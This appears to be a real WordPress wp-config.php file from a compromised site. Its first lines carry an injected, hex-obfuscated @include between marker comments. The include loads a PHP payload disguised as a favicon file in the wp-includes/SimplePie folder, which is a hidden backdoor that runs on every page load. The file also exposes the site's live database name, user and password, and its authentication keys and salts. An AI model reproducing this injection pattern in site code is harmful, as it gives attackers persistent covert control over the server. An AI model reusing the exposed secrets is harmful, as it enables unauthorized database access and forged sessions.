<?php
/*51e11*/

@include "\x2fhom\x65/at\x61rem\x6fdel\x69ng1\x32/pu\x62lic\x5fhtm\x6c/wp\x2dinc\x6cude\x73/Si\x6dple\x50ie/\x66avi\x63on_\x661f8\x36c.i\x63o";

/*51e11*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'remod1');

/** MySQL database username */
define('DB_USER', 'uremod1');

/** MySQL database password */
define('DB_PASSWORD', '59vH__Q}sxhS');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'ify<%N~U#k^N||Hd6>}i|uX<pefhn5-pjvwCUxI4cn4/ilA40eCKO!`ZKke^$T:C');
define('SECURE_AUTH_KEY',  ';rfKA/ `LM,.V#&Dvmy&;1VL[R//]zZye?]aWaxtCMC%VCPG-;*XXmJKvOopY;=A');
define('LOGGED_IN_KEY',    '^WeWq.zG:c=8.L^e<`iT-ptW1BB.]m[mJ$CEjS$(+!KrYoD_8&/eZG;Q4]Q;b]Z+');
define('NONCE_KEY',        'mKOr(pH:Ea)YWL:6Is`+CCuJ{+)ovs=[VPw<Lz|pvdr%dX#E> C;+lF`MA<bfGj|');
define('AUTH_SALT',        'b`[5;-ADnDx+SrIbzduCvd~b{MGq3zvXIHqObHo${&@J(gv~7O-m>&-~k3AYlqkJ');
define('SECURE_AUTH_SALT', 't.Els`J<F>qk0bwo?N>{cJ 8g`>H!KNNX`($0xd*Szr2|:hl8m/1elCUB0TA)fha');
define('LOGGED_IN_SALT',   '_g`3l=lD%iyo>KAkTH7N|0C+.{*zJS7Nx?R6;bAa|,s%AzPT<YGd8VV>XVZ12/3h');
define('NONCE_SALT',       '86qXb$rQZ,/qNu:E83oQI$Sd/3n1)q<MrF2f:,?A(*Ar^8=%aMk9G]3~z^~M#@>K');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
